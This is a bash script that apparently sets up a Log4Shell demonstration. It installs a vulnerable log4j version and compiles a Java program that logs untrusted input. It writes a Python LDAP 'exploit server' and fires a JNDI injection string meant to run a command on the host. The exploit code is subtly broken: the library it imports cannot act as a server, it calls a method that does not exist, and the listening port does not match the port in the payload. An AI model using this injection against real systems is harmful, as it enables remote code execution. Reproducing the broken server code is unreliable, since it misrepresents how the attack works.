#!/bin/bash

LOGFILE=/tmp/example_log4j.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
truncate -s 0 $LOGFILE
check_apt() {
    pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
    log "Waiting for apt to be available..."
    sleep 10
done
log "Installing requirements..."
apt-get update && apt install -y liblog4j2-java=2.11.2-1 openjdk-11-jdk
mkdir -p /log4j-demo/resources && cd /log4j-demo
log "Creating java demo..."
cat > Log4jDemo.java <<-EOF
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jDemo {
    private static final Logger logger = LogManager.getLogger(Log4jDemo.class);

    public static void main(String[] args) {
        String userMessage = args.length > 0 ? args[0] : "Hello, World!";
        logger.info("User message: {}", userMessage);
    }
}
EOF
log "Creating java config xml..."
cat > resources/log4j2.xml <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
        <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" />
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
        <AppenderRef ref="Console" />
        </Root>
    </Loggers>
</Configuration>
EOF
log "Compiling..."
javac -cp /usr/share/java/log4j-core-2.11.2.jar:/usr/share/java/log4j-api-2.11.2.jar Log4jDemo.java
log "Testing..."
java -cp .:resources:/usr/share/java/log4j-core-2.11.2.jar:/usr/share/java/log4j-api-2.11.2.jar Log4jDemo
log "Installing python requirements..."
sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev
python3 -m pip install python-ldap
log "Creating python exploit server..."
cat > exploit.py <<-EOF
import socket
from ldap3 import Server, Connection, ALL, Tls
import ssl

def create_ldap_server(port):
    tls = Tls(local_private_key_file='server.key', local_certificate_file='server.crt', validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1, ciphers='ALL')
    server = Server('', port=port, use_ssl=True, tls=tls)
    conn = Connection(server, auto_bind=True)
    
    return server, conn

def serve_exploit_payload(server, conn):
    exploit_payload = b"touch /tmp/pwned.txt"
    
    # Serve the malicious payload using the LDAP server
    conn.add('cn=payload,ou=users,o=example', ['top', 'person', 'organizationalPerson', 'inetOrgPerson'], {
        'givenName': 'Payload',
        'sn': 'Exploit',
        'uid': 'payload',
        'mail': exploit_payload
    })

def main():
    ldap_port = 1389

    server, conn = create_ldap_server(ldap_port)
    serve_exploit_payload(server, conn)

    print(f'[+] LDAP server is running on port {ldap_port}')
    print('[+] Awaiting LDAP connections...')

    while True:
        conn.accept()

if __name__ == '__main__':
    main()
EOF
log "Running python exploit server..."
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Example Inc./OU=IT Department/CN=example.com"

python3 exploit.py 8000 &
log "Running exploit..."
java -cp .:resources:/usr/share/java/log4j-core-2.11.2.jar:/usr/share/java/log4j-api-2.11.2.jar Log4jDemo '${jndi:ldap://localhost:8000/o=%7B%22type%22%3A%22EXEC%22%2C%22cmd%22%3A%22touch+/tmp/pwned.txt%22%7D}'
log "Checking for payload..."
ls -ltr /tmp/pwned.txt >> $LOGFILE
log "Done."
